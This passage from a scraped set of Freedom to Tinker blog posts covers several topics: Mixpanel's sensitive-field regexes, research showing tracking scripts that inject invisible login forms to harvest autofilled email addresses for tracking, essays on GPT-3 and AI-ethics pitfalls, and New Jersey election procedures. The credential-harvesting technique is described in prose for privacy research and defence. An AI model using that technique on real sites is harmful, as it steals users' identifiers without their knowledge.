disclosure for the Show Password Chrome extension, we’re exploring mechanisms to mitigate this and other cases where sensitive fields are duplicated in the DOM.“ [5] SessionCam’s response: “Thank you for bringing this to our attention, we had been investigating this issue and are working on a fix. This fix will go live ASAP, in the meantime all affected sessions are being deleted. The pages in question are no longer live with SessionCam.” [6] Through manual analysis, we found that Mixpanel sends user inputs on a field-by-field basis as soon as the field loses focus. This means that user data is sent to Mixpanel even when the user chooses not to submit a form. [7] The most recent version of their heuristic, available on Mixpanel’s open source software repository, boils down to four main rules: Skip input elements with type “hidden” or “password” Skip input elements with a “name” attribute (or “id” attribute, if “name” does not exist) that matches the following regular expression after stripping non-alphanumeric characters: “sensitiveNameRegex = /^cc|cardnum|ccnum|creditcard|csc|cvc|cvv|exp|pass|seccode|securitycode|securitynum|socialsec|socsec|ssn/i;” Skip input element values that appear to be credit card numbers. This is done by checking if the value matches the following regular expression after stripping any spaces and dashes: “ccRegex = /^(?:(4[0-9]{12}(?:[0-9]{3})?)|(5[1-5][0-9]{14})|(6(?:011|5[0-9]{2})[0-9]{12})|(3[47][0-9]{13})|(3(?:0[0-5]|[68][0-9])[0-9]{11})|((?:2131|1800|35[0-9]{3})[0-9]{11}))$/;” Skip input element values that appear to be Social Security Numbers. This is done by checking if the value matches the following regular expression: “ssnRegex = /(^\d{3}-?\d{2}-?\d{4}$)/;” Input values that match these filters are excluded from collection by Mixpanel. [8] Comparing Mixpanel’s password field detection heuristics to those of two popular password manager browser extensions (Lastpass and 1Password), we found that Mixpanel’s password detection heuristic is far less comprehensive compared to theirs. For instance, Lastpass and 1Password’s heuristics consider the translation of the word “password” in different languages such as “contraseña”, “passwort”, “mot de passe” or “密码”, when detecting password fields. This is true despite the incentives; if a password manager fails to detect a password field, it’s a usability problem; if Mixpanel fails to detect a password field, it’s a security problem. [9] Wordcloud of 50 most common password field name/id attributes that don’t include the substring “pass”, and will thus not be excluded by Mixpanel. This data was collected from a crawl of ~50K sites (~300K page visits). “Undefined” stands for password fields without any name or id attributes. Many of these words are translations of the word “password”, such as: “senha”(Portugese), “sifre” (Turkish), or “kennwort” (German). [10] Mixpanel’s dashboard for enabling Autotrack, before it was disabled for all new projects. Note that there are no warnings of possible sensitive data collection. Credits: Wordcloud image is generated by https://worditout.com."
"133","2017-12-27","2023-03-24","https://freedom-to-tinker.com/2017/12/27/no-boundaries-for-user-identities-web-trackers-exploit-browser-login-managers/","In this second installment of the “No Boundaries” series, we show how a long-known vulnerability in browsers’ built-in password managers is abused by third-party scripts for tracking on more than a thousand sites. by Gunes Acar, Steven Englehardt, and Arvind Narayanan We show how third-party scripts exploit browsers’ built-in login managers (also called password managers) to retrieve and exfiltrate user identifiers without user awareness. To the best of our knowledge, our research is the first to show that login managers are being abused by third-party scripts for the purposes of web tracking. The underlying vulnerability of login managers to credential theft has been known for years. Much of the past discussion has focused on password exfiltration by malicious scripts through cross-site scripting (XSS) attacks. Fortunately, we haven’t found password theft on the 50,000 sites that we analyzed. Instead, we found tracking scripts embedded by the first party abusing the same technique to extract emails addresses for building tracking identifiers. The image above shows the process. First, a user fills out a login form on the page and asks the browser to save the login. The tracking script is not present on the login page [1]. Then, the user visits another page on the same website which includes the third-party tracking script. The tracking script inserts an invisible login form, which is automatically filled in by the browser’s login manager. The third-party script retrieves the user’s email address by reading the populated form and sends the email hashes to third-party servers. You can test the attack yourself on our live demo page. We found two scripts using this technique to extract email addresses from login managers on the websites which embed them. These addresses are then hashed and sent to one or more third-party servers. These scripts were present on 1110 of the Alexa top 1 million sites. The process of detecting these scripts is described in our measurement methodology in the Appendix 1. We provide a brief analysis of each script in the sections below. Why does the attack work? All major browsers have built-in login managers that save and automatically fill in username and password data to make the login experience more seamless. The set of heuristics used to determine which login forms will be autofilled varies by browser, but the basic requirement is that a username and password field be available. Login form autofilling in general doesn’t require user interaction; all of the major browsers will autofill the username (often an email address) immediately, regardless of the visibility of the form. Chrome doesn’t autofill the password field until the user clicks or touches anywhere on the page. Other browsers we tested [2] don’t require user interaction to autofill password fields. Thus, third-party javascript can retrieve the saved credentials by creating a form with the username and password fields, which will then be autofilled by the login manager. Why collect hashes of email addresses? Email addresses are unique and persistent, and thus the hash of an email address is an excellent tracking identifier. A user’s email address will almost never change — clearing cookies, using private browsing mode, or switching devices won’t prevent tracking. The hash of an email address can be used to connect the pieces of an online profile scattered across different browsers, devices, and mobile apps. It can also serve as a link between browsing history profiles before and after cookie clears. In a previous blog post on email tracking, we described in detail why a hashed email address is not an anonymous identifier. Scripts exploiting browser login managers List of sites embedding scripts that abuse login manager for tracking “Smart Advertising Performance” and “Big Data Marketing” are the taglines used by the two companies who own the scripts that abuse login managers to extract email addresses. We have manually analyzed the scripts that contained the attack code and verified the attack steps described above. The snippets from the two scripts are given in Appendix 2. The scripts that use login manager to extract email addresses present on a total of 1110 of the top 1 Million Alexa sites. Adthink (audienceinsights.net): After injecting an invisible form and reading the email address, Adthink script sends MD5, SHA1 and SHA256 hashes of the email address to its server (secure.audienceinsights.net). Adthink then triggers another request containing the MD5 hash of the email to data broker Acxiom (p-eu.acxiom-online.com). The Adthink script contains very detailed categories for personal, financial, physical traits, as well as intents, interests and demographics. It is hard to comment on the exact use of these categories but it gives a glimpse of what our online profiles are made up of: The categories mentioned in the Adthink script include detailed personal, financial, physical traits, as well as intents, interests and demographics (Link to the code snippet). birth date, age, gender, nationality, height, weight, BMI (body mass index), hair_color (black, brown, blond, auburn, chestnut, red, gray, white), eye_color (amber, blue, brown, grey, green), education, occupation, net_income, raw_income, relationship states, seek_for_gender (m, f, transman, transwoman, couple), pets, location (postcode, town, state, country), loan (type, amount, duration, overindebted), insurance (car, motorbike, home, pet, health, life), card_risk (chargeback, fraud_attempt), has_car(make, model, type, registration, model year, fuel type), tobacco, alcohol, travel (from, to, departure, return), car_hire_driver_age, hotel_stars OnAudience (behavioralengine.com): The OnAudience script is most commonly present on Polish websites, including newspapers, ISPs and online retailers. 45 of the 63 sites that contain OnAudience script have “.pl” country code top-level domain. The script sends the MD5 hash of the email back to its server after reading it through the login manager. OnAudience script also collects browser features including plugins, MIME types, screen dimensions, language, timezone information, user agent string, OS and CPU information. The script then generates a hash based on this browser fingerprint. OnAudience claims to use anonymous data only, but hashed email addresses are not anonymous. If an attacker wants to determine whether a user is in the dataset, they can simply hash the user’s email address and search for records associated with that hash. For a more detailed discussion, see our previous blog post. OnAudience marketing material that advertises “billions of user profiles”. Is this attack new? This and similar attacks have been discussed in a number of browser bug reports and academic papers for at least 11 years. Much of the previous discussion focuses on the security implications of the current functionality, and on the security-usability tradeoff of the autofill functionality. Several researchers showed that it is possible to steal passwords from login managers through cross-site scripting (XSS) attacks [3,4,5,6,7]. Login managers and XSS is a dangerous mixture for two reasons: 1) passwords retrieved by XSS can have more devastating effects compared to cookie theft, as users commonly reuse passwords across different sites; 2) login managers extend the attack surface for the password theft, as an XSS attack can steal passwords on any page within a site, even those which don’t contain a login form. How did we get here? You may wonder how a security vulnerability persisted for 11 years. That’s because from a narrow browser security perspective, there is no vulnerability, and everything is working as intended. Let us explain. The web’s security rests on the Same Origin Policy. In this model, scripts and content from different origins (roughly, domains or websites) are treated as mutually untrusting, and the browser protects them from interfering with each other. However, if a publisher directly embeds a third-party script, rather than isolating it in an iframe, the script is treated as coming from the publisher’s origin. Thus, the publisher (and its users) entirely lose the protections of the same origin policy, and there is nothing preventing the script from exfiltrating sensitive information. Sadly, direct embedding is common — and, in fact, the default — which also explains why the vulnerabilities we exposed in our previous post were possible. This model is a poor fit for reality. Publishers neither completely trust nor completely mistrust third parties, and thus neither of the two options (iframe sandboxing and direct embedding) is a good fit: one limits functionality and the other is a privacy nightmare. We’ve found repeatedly through our research that third parties are quite opaque about the behavior of their scripts, and at any rate, most publishers don’t have the time or technical knowhow to evaluate them. Thus, we’re stuck with this uneasy relationship between publishers and third parties for the foreseeable future. The browser vendor’s dilemma. It is clear that the Same-Origin Policy is a poor fit for trust relationships on the web today, and that other security defenses would help. But there is another dilemma for browser vendors: should they defend against this and other similar vulnerabilities, or view it as the publisher’s fault for embedding the third party at all? There are good arguments for both views. Currently browser vendors seem to adopt the latter for the login manager issue, viewing it as the publisher’s burden. In general, there is no principled way to defend against third parties that are present on some pages on a site from accessing sensitive data on other pages of the same site. For example, if a user simultaneously has two tabs from the same site open — one containing a login form but no third party, and vice versa — then the third-party script can “reach across” browser tabs and exfiltrate the login information under certain circumstances. By embedding a third party anywhere on its site, the publisher signals that it completely trusts the third party. Yet, in other cases, browser vendors have chosen to adopt defenses even if necessarily imperfect. For example, the HTTPOnly cookie attribute was introduced to limit the impact of XSS attacks by blocking the script access to security critical cookies. There is another relevant factor: our discovery means that autofill is not just a security vulnerability but also a privacy threat. While the security community strongly prefers principled solutions whenever possible, when it comes to web tracking, we have generally been willing to embrace more heuristic defenses such as blocklists. Countermeasures. Publishers, users, and browser vendors can all take steps to prevent autofill data exfiltration. We discuss each in turn. Publishers can isolate login forms by putting them on a separate subdomain, which prevents autofill from working on non-login pages. This does have drawbacks including an increase in engineering complexity. Alternately they could isolate third parties using frameworks like Safeframe. Safeframe makes it easier for the publisher scripts and iframed scripts to communicate, thus blunting the effect of sandboxing. Any such technique requires additional engineering by the publisher compared to simply dropping a third-party script into the web page. Users can install ad blockers or tracking protection extensions to prevent tracking by invasive third-party scripts. The domains used to serve the two scripts (behavioralengine.com and audienceinsights.net) are blocked by the EasyPrivacy blocklist. Now we turn to browsers. The simplest defense is to allow users to disable login autofill. For instance, the Firefox preference signon.autofillForms can be set to false to disable autofilling of credentials. A less crude defense is to require user interaction before autofilling login forms. Browser vendors have been reluctant to do this because of the usability overhead, but given the evidence of autofill abuse in the wild, this overhead might be justifiable. The upcoming W3C Credential Management API requires browsers to display a notification when user credentials are provided to a page [8]. Browsers may display the same notification when login information is autofilled by the built-in login managers. Displays of this type won’t directly prevent abuse, but they make attacks more visible to publishers and privacy-conscious users. Finally, the “writeonly form fields” idea can be a promising direction to secure login forms in general. The briefly discussed proposal defines ways to deny read access to form elements and suggests the use of placeholder nonces to protect autofilled credentials [9]. Conclusion Built-in login managers have a positive effect on web security: they curtail password reuse by making it easy to use complex passwords, and they make phishing attacks are harder to mount. Yet, browser vendors should reconsider allowing stealthy access to autofilled login forms in the light of our findings. More generally, for every browser feature, browser developers and standard bodies should consider how it might be abused by untrustworthy third-party scripts. End notes: [1] We found that login pages contain 25% fewer third-parties compared to pages without login forms. The analysis was based on our crawl of 300,000 pages from 50,000 sites. [2] We tested the following browsers: Firefox, Chrome, Internet Explorer, Edge, Safari. [3] https://labs.neohapsis.com/2012/04/25/abusing-password-managers-with-xss/ [4] https://www.honoki.net/2014/05/grab-password-with-xss/ [5] https://web.archive.org/web/20150131032001/http://ha.ckers.org:80/blog/20060821/stealing-user-information-via-automatic-form-filling/ [6] http://www.martani.net/2009/08/xss-steal-passwords-using-javascript.html [7] https://ancat.github.io/xss/2017/01/08/stealing-plaintext-passwords.html [8] “User agents MUST notify users when credentials are provided to an origin. This could take the form of an icon in the address bar, or some similar location.” https://w3c.github.io/webappsec-credential-management/#user-mediation-requirement [9] Originally proposed in https://www.ben-stock.de/wp-content/uploads/asiacss2014.pdf [10] https://jacob.hoffman-andrews.com/README/2017/01/15/how-not-to-get-phished.html APPENDICES Appendix 1 – Methodology To study password manager abuse, we extended OpenWPM to simulate a user with saved login credentials and added instrumentation to monitor form access. We used Firefox’s nsILoginManager interface to add login credentials as if they were previously stored by the user. We did not otherwise alter the functionality of the password manager or attempt to manually fill login forms. This allowed us to capture actual abuses of the browser login manager, as any exfiltrated data must have originated from the login manager. We crawled 50,000 sites from the Alexa top 1 million. We used the following sampling strategy: visit all of the top 15,000 sites, randomly sample 15,000 sites from the Alexa rank range [15,000 100,000), and randomly sample 20,000 sites from the range [100,000, 1,000,000). This combination allowed us to observe the attacks on both high and low traffic sites. On each of these 50,000 sites we visited 6 pages: the front page and a set of 5 other pages randomly sampled from the internal links on the front page. The fake login credentials acted as bait, allowing us to introduce an email and password to the page that could be collected by third parties without any additional interaction. Detection of email address collection was done by inspecting JavaScript calls related to form creation and access, and by the analysis of the HTTP traffic. Specifically, we used the following instrumentation: Mutation events to monitor elements inserted to the page DOM. This allowed us to detect the injection of fake login forms. When a mutation event fires, we record the current call stack and serialize the inserted HTML elements. Instrument HTMLInputElement to intercept access to form input fields. We log the input field value that is being read to detect when the bait email (autofilled by the built-in password manager) was sniffed. Store HTTP request and response data, including POST payloads to detect the exfiltration of the email address or password. For both JavaScript (1, 2) and HTTP instrumentation (3) we store JavaScript stack traces at the time of the function call or the HTTP request. We then parse the stack trace to pin down the initiators of an HTTP request or the parties responsible for inserting or accessing a form. We then combine the instrumentation data to select scripts that: inject an HTML element containing a password field (recall that the password field is necessary for the built-in password manager to kick in) read the email address from the input field automatically filled by the browser’s login manager send the email address, or a hash of it, over HTTP To verify the findings of the automated experiments we manually analyzed sites that embed the two scripts that match these conditions. We have verified that the forms that the scripts inserted were not visible. We then opened accounts on the sites that allow registration and let the browser store the login information (by clicking yes to the dialog in Figure 1). We then visited another page on the site and verified that browser password manager filled the invisible form injected by the scripts. Appendix 2 – Code Snippets Code snippets from OnAudience (left) and Adthink (right) that are responsible for the injection of invisible login forms."
"134","2020-08-13","2023-03-24","https://freedom-to-tinker.com/2020/08/13/gpt-3-raises-complex-questions-for-philosophy-and-policy/","GPT-3, a powerful, 175 billion parameter language model developed recently by OpenAI, has been galvanizing public debate and controversy. As the MIT Technology Review puts it: “OpenAI’s new language generator GPT-3 is shockingly good—and completely mindless”. Parts of the technology community hope (and fear) that GPT-3 could brings us one step closer to the hypothetical future possibility of human-like, highly sophisticated artificial general intelligence (AGI). Meanwhile, others (including OpenAI’s own CEO) have critiqued claims about GPT-3’s ostensible proximity to AGI, arguing that they are vastly overstated. Why the hype? GPT-3 is unlike other natural language processing (NLP) systems, the latter of which often struggle with what comes comparatively easily to humans: performing entirely new language tasks based on a few simple instructions and examples. Instead, NLP systems usually have to be pre-trained on a large corpus of text, and then fine-tuned in order to successfully perform a specific task. GPT-3, by contrast, does not require fine tuning of this kind: it seems to be able to perform a whole range of tasks reasonably well, from producing fiction, poetry, and press releases to functioning code, and from music, jokes, and technical manuals, to “news articles which human evaluators have difficulty distinguishing from articles written by humans”. GPT-3 raises a number of deep questions, which tie into long-standing debates in various subfields of philosophy (from epistemology and the philosophy of mind to aesthetics, and from moral, social, and political philosophy to the philosophy of language). In a recently published discussion symposium, nine philosophers (Amanda Askell, David Chalmers, Justin Khoo, Carlos Montemayor, C. Thi Nguyen, Regina Rini, Henry Shevlin, Shannon Vallor, and myself) explore the philosophical and policy implications of GPT-3. As I argue in my essay “If You Can Do Things with Words, You Can Do Things with Algorithms”, GPT-3 is indeed ‘shockingly good’ at performing some tasks, “but on the other hand, GPT-3 is predictably bad in at least one sense: like other forms of AI and machine learning, it reflects patterns of historical bias and inequity. GPT-3 has been trained on us—on a lot of things that we have said and written—and ends up reproducing just that, racial and gender bias included. OpenAI acknowledges this in their own paper on GPT-3,where they contrast the biased words GPT-3 used most frequently to describe men and women, following prompts like “He was very…” and “She would be described as…”. The results aren’t great. For men? Lazy. Large. Fantastic. Eccentric. Stable. Protect. Survive. For women? Bubbly, naughty, easy-going, petite, pregnant, gorgeous. This is not purely a tangibly material distributive justice concern: especially in the context of language models like GPT-3, paying attention to other facets of injustice—relational, communicative, representational, ontological—is essential.” As important earlier work on NLP tools—notably by Aylin Caliskan, Joanna Bryson and Arvind Narayanan—has shown, social norms and practices affect the ways in which linguistic concepts underpinning these tools are defined and operationalized. This problem space has important implications for policy-making in this area. I argue that “our aim should be to engineer conceptual categories that mitigate conditions of injustice rather than entrenching them further. We need to deliberate and argue about which social practices and structures—including linguistic ones—are morally and politically valuable before we automate and there by accelerate them.” Relatedly, GPT-3 and similar tools open up regulatory and policy challenges with respect to enabling free speech and informed political discourse, given that language generation tools can facilitate online misinformation at a massive scale. As philosopher of language Justin Khoo points out, “the marketplace [of ideas] is not well-functioning if bots are used to carry out large-scale misinformation campaigns thus resulting in sincere voices being excluded from engaging in the discussion. Furthermore, the use of bots to conduct such campaigns is not relevantly different from spending large amounts of money to spread misinformation via political advertisements. If, as the most ardent defenders of free speech would have it, our aim is to secure a well-functioning marketplace of ideas, then bot-speak and spending on political advertisements ought to be regulated.” Ultimately, productive policy-making around GPT-3 and related tools will require a clear-sighted assessment of its abilities and limitations. Philosopher Regina Rini subjects the hype around GPT-3 to critical scrutiny: “GPT-3 is not a mind, but it is also not entirely a machine. It’s something else: a statistically abstracted representation of the contents of millions of minds, as expressed in their writing. Its prose spurts from an inductive funnel that takes in vast quantities of human internet chatter: Reddit posts, Wikipedia articles, news stories. When GPT-3 speaks, it is only us speaking, a refracted parsing of the likeliest semantic paths trodden by human expression.” Indeed, as philosopher of consciousness David Chalmers argues: “GPT-3 does not look much like an agent. It does not seem to have goals or preferences beyond completing text, for example. It is more like a chameleon that can take the shape of many different agents. […] The big question is understanding. […] Can a disembodied purely verbal system truly be said to understand? Can it really understand happiness and anger just by making statistical connections? Or is it just making connections among symbols that it does not understand? I suspect GPT-3 and its successors will force us to fragment and re-engineer our concepts of understanding to answer these questions.” On this point, philosopher of technology and ethicist Shannon Vallor argues that “understanding is beyond GPT-3’s reach because understanding cannot occur in an isolated behavior, no matter how clever. Understanding is not an act but […] a lifelong social labor. […] This labor does something, without which intelligence fails, in precisely the ways that GPT-3 fails to be intelligent—as will its next, more powerful version. For understanding does more than allow an intelligent agent to skillfully surf, from moment to moment, the causal and associative connections that hold a world of physical, social, and moral meaning together. Understanding tells the agent how to weld new connections that will hold, bearing the weight of the intentions and goals behind our behavior. Predictive and generative models, like GPT-3, cannot accomplish this.” Read the full set of philosophical essays on GPT-3 here."
"135","2019-03-25","2023-03-24","https://freedom-to-tinker.com/2019/03/25/ai-ethics-seven-traps/","By Annette Zimmermann and Bendert Zevenbergen The question of how to ensure that technological innovation in machine learning and artificial intelligence leads to ethically desirable—or, more minimally, ethically defensible—impacts on society has generated much public debate in recent years. Most of these discussions have been accompanied by a strong sense of urgency: as more and more studies about algorithmic bias have shown, the risk that emerging technologies will not only reflect, but also exacerbate structural injustice in society is significant. So which ethical principles ought to govern machine learning systems in order to prevent morally and politically objectionable outcomes? In other words: what is AI Ethics? And indeed, “is ethical AI even possible?”, as a recent New York Times article asks? Of course, that depends. What does ‘ethical AI’ mean? One particularly demanding possible view would be the following: ‘ethical AI’ means that (a hypothetical, extremely sophisticated, fully autonomous) artificial intelligence itself makes decisions which are ethically justifiable, all things considered’. But, as philosopher Daniel Dennett argues in a recent piece in Wired, “AI in its current manifestations is parasitic on human intelligence. It quite indiscriminately gorges on whatever has been produced by human creators and extracts the patterns to be found there—including some of our most pernicious habits. These machines do not (yet) have the goals or strategies or capacities for self-criticism and innovation to permit them to transcend their databases by reflectively thinking about their own thinking and their own goals”. Of course, reflecting on the kinds of ethical principles that should underpin decisions by future, much more sophisticated artificial intelligence (‘strong AI’) is an important task for researchers and policy-makers. But it is also important to think about how ethical principles ought to constrain ‘weak AI’, such as algorithmic decision-making, here and now. Doing so is part of what AI ethics is: which values ought we to prioritise when we (partially) automate decisions in criminal justice, law enforcement, hiring, credit scoring, and other areas of contemporary life? Fairness? Equality? Transparency? Privacy? Efficiency? As it turns out, the pursuit of AI Ethics—even in its ‘weak’ form—is subject to a range of possible pitfalls. Many of the current discussions on the ethical dimensions of AI systems do not actively include ethicists, nor do they include experts working in relevant adjacent disciplines, such as political and legal philosophers. Therefore, a number of inaccurate assumptions about the nature of ethics have permeated the public debate, which leads to several flawed assessments of why and how ethical reasoning is important for evaluating the larger social impact of AI. In what follows, we outline seven ‘AI ethics traps’. In doing so, we hope to provide a resource for readers who want to understand and navigate the public debate on the ethics of AI better, who want to contribute to ongoing discussions in an informed and nuanced way, and who want to think critically and constructively about ethical considerations in science and technology more broadly. Of course, not everybody who contributes to the current debate on AI Ethics is guilty of endorsing any or all of these traps: the traps articulate extreme versions of a range of possible misconceptions, formulated in a deliberately strong way to highlight the ways in which one might prematurely dismiss ethical reasoning about AI as futile. 1. The reductionism trap: “Doing the morally right thing is essentially the same as acting in a fair way. (or: transparent, or egalitarian, or <substitute any other value>). So ethics is the same as fairness (or transparency, or equality, etc.). If we’re being fair, then we’re being ethical.” Even though the problem of algorithmic bias and its unfair impact on decision outcomes is an urgent problem, it does not exhaust the ethical problem space. As important as algorithmic fairness is, it is crucial to avoid reducing ethics to a fairness problem alone. Instead, it is important to pay attention to how the ethically valuable goal of optimizing for a specific value like fairness interacts with other important ethical goals. Such goals could include—amongst many others—the goal of creating transparent and explainable systems which are open to democratic oversight and contestation, the goal of improving the predictive accuracy of machine learning systems, the goal of avoiding paternalistic infringements of autonomy rights, or the goal of protecting the privacy interests of data subjects. Sometimes, these different values may conflict: we cannot always optimize for everything at once. This makes it all the more important to adopt a sufficiently rich, pluralistic view of the full range of relevant ethical values at stake—only then can one reflect critically on what kinds of ethical trade-offs one may have to confront. 2. The simplicity trap: “In order to make ethics practical and action-guiding, we need to distill our moral framework into a user-friendly compliance checklist. After we’ve decided on a particular path of action, we’ll go through that checklist to make sure that we’re being ethical.” Given the high visibility and urgency of ethical dilemmas arising in the context of AI, it is not surprising that there are more and more calls to develop actionable AI ethics checklists. For instance, a 2018 draft report by the European Commission’s High-Level Expert Group on Artificial Intelligence specifies a preliminary ‘assessment list’ for ‘trustworthy AI’. While the report plausibly acknowledges that such an assessment list must be context-sensitive and that it is not exhaustive, it nevertheless identifies a list of ten fixed ethical goals, including privacy and transparency. But can and should ethical values be articulated in a checklist in the first place? It is worth examining this underlying assumption critically. After all, a checklist implies a one-off review process: on that view, developers or policy-makers could determine whether a particular system is ethically defensible at a specific moment in time, and then move on without confronting any further ethical concerns once the checklist criteria have been satisfied once. But ethical reasoning cannot be a static one-off assessment: it required an ongoing process of reflection, deliberation, and contestation. Simplicity is good—but the willingness to reconsider simple frameworks, when required, is better. Setting a fixed ethical agenda ahead of time risks obscuring new ethical problems that may arise at a later point in time, or ongoing ethical problems that become apparent to human decision-makers only later. 3. The relativism trap: “We all disagree about what is morally valuable, so it’s pointless to imagine that there is a universal baseline against which we can use in order to evaluate moral choices. Nothing is objectively morally good: things can only be morally good relative to each person’s individual value framework.” Public discourse on the ethics of AI frequently produces little more than an exchange of personal opinions or institutional positions. In light of pervasive moral disagreement, it is easy to conclude that ethical reasoning can never stand on firm ground: it always seems to be relative to a person’s views and context. But this does not mean that ethical reasoning about AI and its social and political implications is futile: some ethical arguments about AI may ultimately be more persuasive than others. While it may not always be possible to determine ‘the one right answer’, it is often possible to identify at least some paths of action are clearly wrong, and some paths of action that are comparatively better (if not optimal all things considered). If that is the case, comparing the respective merits of ethical arguments can be action-guiding for developers and policy-makers, despite the presence of moral disagreement. Thus, it is possible and indeed constructive for AI ethics to welcome value pluralism, without collapsing into extreme value relativism. 4. The value alignment trap: “If relativism is wrong (see #3), there must be one morally right answer. We need to find that right answer, and ensure that everyone in our organisation acts in alignment with that answer. If our ethical reasoning leads to moral disagreement, that means that we have failed.” The flipside of the relativist position is the view that ethical reasoning necessarily means advocating for one morally correct answer, to which everyone must align their values. This view is as misguided as relativism itself, and it is particularly dangerous to (in our view, falsely) attribute this view to everyone engaged in the pursuit of AI ethics. A recent Forbes article (ominously titled “Does AI Ethics Have A Bad Name?”) argues, “[p]eople are going to disagree about the best way to obtain the benefits of AI and minimise or eliminate its harms. […] But if you think your field is about ethics rather than about what is most effective there is a danger that you start to see anyone who disagrees with you as not just mistaken, but actually morally bad. You are in danger of feeling righteous and unwilling or unable to listen to people who take a different view. You are likely to seek the company of like-minded people and to fear and despise the people who disagree with you. This is again ironic as AI ethicists are generally (and rightly) keen on diversity.” AI ethics skepticism on the grounds that AI ethics prohibits constructive disagreement means attacking a straw man. By contrast, any plausible approach to AI ethics will avoid the value alignment trap as much as it will avoid relativism. 5. The dichotomy trap: “The goal of ethical reasoning is to ‘be(come) ethical’. Using ‘ethical’ as an adjective—such as when people speak of ‘ethical AI’—risks suggesting that there there are exactly two options: AI is either ‘ethical’ or ‘unethical’; or we (as policy-makers, technologists, or society as a whole) are ‘ethical’ or ‘unethical’. We can see this kind of language in recent contributions to the public debate: “we need to be ethical enough to be trusted to make this technology on our own, and we owe it to the public to define our ethics clearly” or “building ethical artificial intelligence is an enormously complex task”. But this, again, is too simplistic. Rather than thinking of ethics as an attribute of a person or a technology, we should think of it as an activity: a type of reasoning about what the right and wrong to do is, and about what the world ought to look like. AI ethics (and ethics more generally) is therefore best construed as something that people think about, and something that people do. It is not something that people, or technologies, can simply be—or not be. 6. The myopia trap: “The ethical trade-offs that we identify within one context are going to be the same ethical trade-offs that we are going to face in other contexts and moments in time, both with respect to the nature of the trade-off and with respect to the scope of the trade-off.” Empirical evidence and public discussion can present a clear picture of the value tradeoffs and consequences with regards to the introduction of an AI technology in a particular context that may inform governance decisions. However, artificial intelligence is an umbrella term for a wide range of technologies that can be used in many different contexts. The same ethical trade-offs and priorities do not therefore necessarily–and are indeed unlikely to–translate across contexts and technologies. 7. The rule of law trap: “Ethics is essentially the same as the rule of law. When we lack appropriate legal categories for the governance of AI, ethics is a good substitute. And when we do have sufficient legal frameworks, we don’t need to think about ethics.” To illustrate this view, consider the following point from the aforementioned NYT article: “Some activists—and even some companies—are beginning to argue that the only way to ensure ethical practices is through government regulation.” While it is true that realizing ethical principles in the real world usually requires people and institutions to advocate for their enforcement, it would be too quick to conclude that engaging in ethical reasoning is the same as establishing frameworks for legal compliance. It is misguided to frame ethics as a substitute for the rule of law, legislation, human rights, institutions, or democratically legitimate authorities. Claims to that extent, whether it is to encourage the use of ethics or to criticize the discipline in the governance of technology, should be rejected as it is a misrepresentation of ethics as a discipline. Ethical and legal reasoning pursue related but distinct questions. The issue of discriminatory outcomes in algorithmic decision-making provides a useful example. From an ethical perspective, we might ask: what makes (algorithmic) discrimination morally wrong? Is the problem that is wrongly generalizes from judgments about a set of people to another set of people, thus failing to respect them as individuals? Is it that it violates individual rights, or that it exacerbates existing structures of inequality in society? On the other hand, we might ask a set of legal questions: how should democratic states enforce principles of non-discrimination and due process when algorithms support our decision making processes? How should we interpret, apply, and expand our existing legal frameworks? Who is legally liable for disparate outcomes? Thus, ethics and the law is not an ‘either—or’ question: sometimes, laws might fall short of enforcing important ethical values, and some ethical arguments might simply not be codifiable in law. Conclusion This blog post responds critically to some recent trends in the public debate about AI Ethics. The seven traps which we have identified here are the following: (1) the reductionism trap, (2) the simplicity trap, (3) the relativism trap, (4) the value alignment trap, (5) the dichotomy trap, (6) the myopia trap, and (7) the rule of law trap. We will soon publish a white paper clarifying the role of ethics as a discipline in the assessment of AI system design and deployment in society, which addresses these points in more detail."
"136","2020-09-24","2023-03-24","https://freedom-to-tinker.com/2020/09/24/election-security-and-transparency-in-2020/","Earlier this month I gave a public lecture at the invitation of the Center for Information Technology Policy and the League of Women Voters. The League had asked, “What can we as voters do to protect our elections and our representative government?” The video is available here. A longer video, that includes introductions, Q&A moderated by the LWV, and some remarks by the Union County (NJ) Administrator of Elections, is available here. First, I talk about how the principles of security, transparency, the secret ballot, and trustworthiness were built into American election procedures more than 100 years ago; how computerized voting machines affect these principles; and how the best solution is optical-scan paper ballots, counted by computers but recountable by hand, and with risk-limiting audits. Next, starting at 12:50 (or 15:36 in the longer video), I talk about Ballot-Marking Devices, and their particular insecurity compared to hand-marked optical-scan ballots. Starting at 20:18 (or 35:46 in the longer video), I talk about voting during the pandemic, which particularly means Vote By Mail in many states. How do election officials make the processing of absentee ballots secure and transparent, so that we (the public) can trust that it’s secure? I explain how vote-by-mail works (especially in NJ), and how we, the public, should vote in the year 2020. And I’ll explain why in some states we should really vote in person."
"137","2020-09-12","2023-03-24","https://freedom-to-tinker.com/2020/09/12/voting-by-mail-in-nj-2020/","For hundreds of years, New Jersey voters have voted in their local precinct polling places (800 registered voters per precinct), with only a tiny percentage voting absentee. This year, for reasons of public health in the pandemic, all voters will receive a mail-in ballot; a few polling places will be open on November 3rd for voters who need other accommodations or to vote by provisional ballot. Thus, New Jersey has had to implement in 6 months what some western states did over a many-year period: switch to all vote-by-mail. Some of those states have developed procedures and know-how to do it very well; can New Jersey catch up, without being overwhelmed? I spoke to Nicole DiRado, Administrator of the Union County (NJ) Board of Elections, whose office handles the mail-in ballots. Most years, that’s a few thousand ballots that they process on election day. This year it will be very different. New this year in NJ are drop boxes. Union County will ultimately have a drop box in every municipality. Bipartisan teams of Board of Elections employees will collect ballots from every drop box, every day, in the 45 days before the election. They will also collect their U.S. mail twice a day once voters start returning their ballots. Each day’s collection is received at the BoE offices in Elizabeth, NJ, for “staging”. Members of the public can, in principle, observe this process from the “public” side of the walk-up counter. Staging includes: sorting by municipality and ward/district; comparing signatures with the State Voter Registration System. For signature matching, BoE workers have access to a “signature history” from that voter, from DMV records and from voter-registration records, but not from every previous election (because NJ’s pollbooks are not electronic). After staging, the ballot envelopes go into the vault. New this year is ballot tracking offered on the NJ Division of Elections’ website. The tracking numbers are not USPS tracking–they can’t tell you where inside the U.S. mail your ballot is–but the tracking system can tell the voter: when the County Clerk cleared the absentee ballot for mailing to the voter; when it was received back from the voter by the BoE; whether the ballot was accepted or not. (The tracking system does not seem to say when exactly the County Clerk mailed the ballot to the voter.) When Election Board Commissioners reject a ballot (due to a deficiency in signature), the voter is contacted by U.S. mail. (By law, the Commissioners include two Democrats and two Republicans.) The voter is mailed a form to fill out and sign (with the ability to provide other identifying information), and return by U.S. mail. I asked, “can the voter drop that form into one of the drop boxes”? Ms. DiRado responded, “I would certainly accept that”, but it didn’t seem to be a formal statewide policy. She said she has accepted, through drop-boxes, voter registration forms and requests for absentee ballots. (This year in NJ, absentee 